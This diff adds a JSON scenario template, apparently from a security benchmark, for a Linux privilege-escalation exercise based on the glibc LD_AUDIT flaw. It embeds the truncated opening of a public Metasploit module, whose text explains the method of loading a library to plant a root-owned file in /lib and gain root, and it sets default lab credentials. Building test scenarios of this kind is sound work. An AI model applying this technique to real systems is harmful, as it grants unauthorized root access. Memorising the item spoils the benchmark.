@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44025",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: glibc - 'LD_AUDIT' Arbitrary DSO Load Privilege Escalation (Metasploit) (CVE-2010-3856;CVE-2010-3847)\n\nExploit source code (44025.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/exploit/local/linux'\nrequire 'msf/core/exploit/exe'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by abusing\n        a vulnerability in the GNU C Library (glibc) dynamic linker.\n\n        glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not\n        properly restrict use of the LD_AUDIT environment variable when loading\n        setuid executables. This allows loading arbitrary shared objects from\n        the trusted library search path with the privileges of the suid user.\n\n        This module uses LD_AUDIT to load the libpcprofile.so shared object,\n        distributed with some versions of glibc, and leverages arbitrary file\n        creation functionality in the library constructor to write a root-owned\n        world-writable file to a system trusted search path (usually /lib).\n        The file is then overwritten with a shared object then loaded with\n        LD_AUDIT resulting in arbitrary code execution.\n\n        This module has been tested successfully on glibc version 2.11.1 on\n        Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386.\n\n        RHEL 5 is reportedly affected, but untested. Some glibc distributions\n        do not contain the libpcprofile.so library required for successful\n        exploitation.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tavis Ormandy', # Discovery and exploit\n          'zx2c4',         # \"I Can't Read and I Won't Race You Either\" exploit\n          'Marco Ivaldi',  # raptor_ldaudit and raptor_ldaudit2 exploits\n          'Todor Donev',   # libmemusage.so exploit\n          'Brendan Coles'  # Metasploit\n        ],\n      'DisclosureDate' => 'Oct 18 2010',\n      'Platform'       => 'linux',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'References'     =>\n        [\n          [ 'CVE', '2010-3847' ],\n          [ 'CVE', '2010-3856' ],\n          [ 'BID', '44154' ],\n          [ 'BID', '44347' ],\n          [ 'EDB', '15274' ],\n          [ 'EDB', '15304' ],\n          [ 'EDB', '18105' ],\n          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Oct/257' ],\n          [ 'URL', 'http://seclists.org/fulldisclosure/2010/Oct/344' ],\n          [ \n```",
+  "cve": "CVE-2010-3856;CVE-2010-3847",
+  "exploitdb_id": "44025",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44025",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
